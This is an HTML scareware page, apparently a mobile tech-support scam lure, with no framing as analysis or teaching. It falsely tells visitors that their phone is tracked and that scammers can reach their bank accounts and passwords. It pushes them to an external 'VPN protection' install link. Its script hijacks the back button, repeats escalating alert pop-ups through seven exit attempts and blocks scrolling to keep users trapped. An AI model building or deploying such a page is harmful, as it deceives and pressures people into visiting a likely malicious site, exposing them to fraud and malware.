<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security Alert</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #000; /* Already black, good */
            color: white;
            height: 100vh;
            overflow: hidden;
            touch-action: manipulation;
            position: fixed;
            width: 100%;
            /* These ensure the body takes up the full viewport and doesn't scroll */
        }
        
        .alert-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9); /* This creates the dark overlay */
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            /* The padding here is key to create space around the centered alert-box */
            padding: 20px; /* This padding applies to the container, pushing the alert-box inwards */
        }
        
        .alert-box {
            background: linear-gradient(135deg, #d10000 0%, #8b0000 100%);
            border: 3px solid #ff0000;
            border-radius: 15px;
            /* This padding applies to the content *inside* the red box */
            padding: 25px; /* Keep content from sticking to the edges of the red box */
            width: 100%; /* Allows it to take up available width within its container */
            max-width: 400px; /* Crucial: This limits the size of the alert box, making it not full screen */
            text-align: center;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 0 15px rgba(255, 0, 0, 0.7); }
            50% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.9); }
            100% { box-shadow: 0 0 15px rgba(255, 0, 0, 0.7); }
        }
        
        .alert-icon {
            width: 60px;
            height: 60px;
            margin-bottom: 15px;
        }
        
        h1 {
            font-size: 22px;
            margin-bottom: 15px;
            color: #fff;
            text-shadow: 0 2px 5px rgba(0,0,0,0.3);
        }
        
        p {
            margin-bottom: 20px;
            font-size: 16px;
            line-height: 1.5;
        }
        
        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        .btn {
            padding: 14px;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .btn-install {
            background: linear-gradient(to right, #00c853, #00e676);
            color: white;
            box-shadow: 0 4px 0 #009624;
        }
        
        .btn-install:active {
            transform: translateY(2px);
            box-shadow: 0 2px 0 #009624;
        }
        
        .btn-cancel {
            background: #333;
            color: #ccc;
        }
        
        .btn-cancel:active {
            background: #444;
        }
        
        .exit-attempts {
            margin-top: 15px;
            font-size: 14px;
            color: #ff9999;
        }
        
        /* Disable zooming and text selection */
        body {
            user-select: none;
            -webkit-user-select: none;
            touch-action: pan-y;
        }

        /* Shake animation (added by your script, but good to have in CSS) */
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20% { transform: translateX(-10px); }
            40% { transform: translateX(10px); }
            60% { transform: translateX(-10px); }
            80% { transform: translateX(10px); }
        }
    </style>
</head>
<body>
    <div class="alert-container" id="alertContainer">
        <div class="alert-box">
            <img src="https://cdn-icons-png.flaticon.com/512/753/753345.png" class="alert-icon" alt="Warning">
            <h1> EMERGENCY SECURITY ALERT ‚ö†Ô∏è</h1>
            <p><strong>YOUR PHONE IS BEING TRACKED!</strong></p>
            <p>Scammers have changed your device location and can access your:</p>
            <p>‚Ä¢ Bank accounts<br>‚Ä¢ Photos<br>‚Ä¢ Passwords</p>
            <div class="btn-group">
                <button class="btn btn-install" onclick="window.location.href='https://antivirus-browser.netlify.app/'">
                    üîí INSTALL VPN PROTECTION NOW
                </button>
                <button class="btn btn-cancel" id="cancelBtn">
                    CANCEL (RISKY)
                </button>
            </div>
            <div class="exit-attempts" id="exitAttempts">
                Warning: 0/7 attempts
            </div>
        </div>
    </div>

    <script>
        let attempts = 0;
        const maxAttempts = 7;
        const cancelBtn = document.getElementById('cancelBtn');
        const exitAttemptsText = document.getElementById('exitAttempts');
        
        // Disable back button
        history.pushState(null, null, location.href);
        window.onpopstate = function(event) {
            history.go(1);
            handleExitAttempt();
        };
        
        // Handle exit attempts
        function handleExitAttempt() {
            attempts++;
            exitAttemptsText.textContent = `Warning: ${attempts}/${maxAttempts} attempts to exit`;
            
            if (attempts < maxAttempts) {
                // Show increasingly urgent warnings
                const warnings = [
                    "Your data is still at risk!",
                    "Scammers are accessing your photos!",
                    "Bank accounts is visible!",
                    "Last chance to protect yourself!",
                    "Security breach detected!",
                    "Critical danger!",
                    "Final warning!"
                ];
                
                alert(`‚ö†Ô∏è ${warnings[attempts-1]}`);
                
                // Make the alert box shake
                const alertBox = document.querySelector('.alert-box');
                alertBox.style.animation = 'none';
                alertBox.offsetHeight; // Trigger reflow
                alertBox.style.animation = 'shake 0.5s, pulse 1.5s infinite';
                
                // The shake animation definition is already in the <style> block,
                // so no need to create a new style element here.
            } else {
                // After 7 attempts, allow exit
                window.location.href = "about:blank";
            }
        }
        
        // Cancel button also counts as attempt
        cancelBtn.addEventListener('click', handleExitAttempt);
        
        // Prevent touch scrolling
        document.addEventListener('touchmove', function(e) {
            e.preventDefault();
        }, { passive: false });
    </script>
</body>
</html>
